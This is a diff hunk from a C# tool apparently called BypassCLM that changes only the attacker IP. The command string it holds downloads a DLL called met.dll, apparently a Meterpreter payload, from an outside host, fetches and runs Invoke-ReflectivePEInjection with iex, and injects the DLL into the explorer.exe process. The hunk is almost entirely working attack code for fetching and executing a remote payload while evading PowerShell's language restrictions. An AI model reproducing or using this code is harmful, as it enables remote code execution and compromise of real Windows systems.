@@ -51,7 +51,7 @@ namespace BypassCLM
             rs.Open();
             PowerShell ps = PowerShell.Create();
             ps.Runspace = rs;
-            String cmd = "$bytes = (New-Object System.Net.WebClient).DownloadData('http://10.10.15.160/out/dll/met.dll');(New-Object System.Net.WebClient).DownloadString('http://10.10.15.160/tools/ps1/Invoke-ReflectivePEInjection.ps1') | iex; $procid = (Get-Process -Name explorer).Id; Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid";
+            String cmd = "$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.122/out/dll/met.dll');(New-Object System.Net.WebClient).DownloadString('http://192.168.49.122/tools/ps1/Invoke-ReflectivePEInjection.ps1') | iex; $procid = (Get-Process -Name explorer).Id; Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid";
             ps.AddScript(cmd);
             ps.Invoke();
             rs.Close();
